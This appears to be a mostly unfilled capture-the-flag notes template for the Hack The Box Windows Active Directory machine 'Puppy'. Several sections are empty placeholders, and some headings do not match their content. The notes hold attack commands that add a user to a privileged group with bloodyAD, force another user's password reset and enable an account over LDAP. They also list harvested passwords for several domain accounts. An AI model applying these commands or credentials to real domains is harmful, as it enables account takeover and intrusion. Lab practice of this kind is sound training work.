---
os: Windows
status: Active
tags:
aliases:
---
[[DPAPI]] , ActiveDirectory [[Misc]] , 
# Resolution summary

>[!summary]
>- Step 1
>- Step 2

## Improved skills

- Skill 1
- Skill 2

## Used tools

- nmap
- gobuster


---
levi.james / KingofAkron2025!
10.10.11.70

# Information Gathering

Scanned all TCP ports:

```sh

```


```sh
levi.james / KingofAkron2025!

faketime "$( ntpdate -q puppy.htb | cut -d ' ' -f 1,2)"  bloodhound-ce-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip

bloodyAD --host "10.10.11.70" -d "PUPPY.HTB" -u "levi.james" -p 'KingofAkron2025!' add groupMember "DEVELOPERS" "LEVI.JAMES"

smbclient //10.10.11.70/SYSVOL -U 'levi.james' -W 'PUPPY.HTB'

liverpool

______

bloodyAD --host "10.10.11.70" -d "PUPPY.HTB" -u "ant.edwards" -p 'Antman2025!' set password "adam.silver" 'P@ssword1!'
ldapmodify -x -H ldap://10.10.11.70 -D 'ant.edwards@PUPPY.HTB' -w 'Antman2025!' -f enable.ldif



```

Enumerated top 200 UDP ports:

```sh
"JAMIE WILLIAMSON","JamieLove2025!"
"ADAM SILVER", adam.silver "HJKL2025!"
"ANTONY C. EDWARDS", ant.edwards "Antman2025!"
"STEVE TUCKER","Steve2025!"
"SAMUEL BLAKE","ILY2025!"

steph.cooper ChefSteph2025!
steph.cooper_adm FivethChipOnItsWay2025!
```

---

# Enumeration

## Port 80 - HTTP (Apache)


---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```
